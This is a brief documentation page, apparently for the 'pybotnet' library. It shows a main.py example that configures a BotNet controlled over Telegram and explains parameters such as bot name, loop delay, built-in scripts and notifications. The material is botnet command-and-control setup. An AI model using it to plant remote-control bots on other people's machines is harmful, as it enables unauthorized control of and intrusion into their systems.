
you can change some config from `BotNet` class

example:


```py title="main.py"

from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)

botnet = BotNet(
    telegram_engine, # (1)
    bot_name="onion!", # (2)
    delay=1.5, # (3)
    use_default_scripts=True, # (4)
    start_end_notify=True, # (5)
    debug=False # (6)
    )

botnet.run()
```

1. Positional parameter engine
2. Custom name for this instance
3. sleep in main_loop
4. use build in scripts, default is `True`
5. Send a message to the user when the program is running or stopped, default is `True`
6. show logs by log level `debug`!, default is `False`
